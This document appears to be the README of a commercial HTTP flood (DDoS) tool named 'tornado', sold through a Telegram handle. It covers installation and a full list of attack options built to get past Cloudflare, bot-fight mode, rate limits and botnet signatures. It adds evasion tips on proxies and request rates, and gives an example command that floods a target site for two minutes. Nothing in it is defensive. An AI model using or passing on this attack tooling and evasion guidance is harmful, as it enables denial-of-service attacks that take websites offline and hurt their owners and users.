Updated: 30.03.2024
Next Update: primary 02.05.2024
So if you are reading this then you have purchased my tornado method without http-ddos, I am thankful that you decided to support me, all updates from cloudflare are free, for updates pm tg @rapidreset

How install node ?: Support 16+ node.js version
1) curl -s https://deb.nodesource.com/setup_16.x | sudo bash
2) sudo apt install nodejs -y && sudo apt instal npm
3) node -v
4) npm i cluster && npm i hpack && npm i .
5) chmod 777 *
After 3nd step it should show 16+ if its shows smaller then 16 search on internet how to install nodejs 16 

How to use the method and its settings:
Method - GET / POST request method
Target - your target (website) SUPPORT %RAND% MODE ex ?q=%RAND%
Time - attack time (seconds)
Threads - number of cores that will work 
Ratelimit - request per second optimal 1-24 for bypass http-ddos
Proxy - your proxy file in *.txt format
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
      --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
      --cookie "f=f" - for custom cookie - also cookie support %RAND% ex: "bypassing=%RAND%"
      --bfm - bot fight mode change to true if you need dont use if no need
      --referer https://target.com / rand - use custom referer if you need and rand - if you need generate domains ex: fwfwwfwfw.net
      --postdata "user=f&pass=%RAND%" - if you need data to post req method format "user=f&pass=f"
      --randrate - randomizer rate 1 to 90 good bypass to rate
      --full - this new func for attack only big backend ex amazon akamai and other... support cf
      --http 1/2/mix - new func choose to type http 1/2/mix (mix 1 & 2)
      --debug - show your status code (maybe low rps to use more resource)
      --header "f:f" or "f:f#f1:f1" - if you need this use custom headers split each header with #
      --legit - this new func for attack with full legit headers non for cf
      --close - this new func for closed session with bad status code ex 403 
      --randpath - this func for bypass signature "known botnets" ater using you path /%RAND%

Tips if you still have known with tornado:
1. Use more extensive proxies or different and very unique ( as an option ipv6 )
2. Use limit ratelimit 10-30 or use --delay / --randrate
3. Use limit threads or don't run the same proxies from many servers 

Example of use:
./tornado method "target" time threads ratelimit proxy 
./tornado GET "https://target.com/" 120 16 60 proxy.txt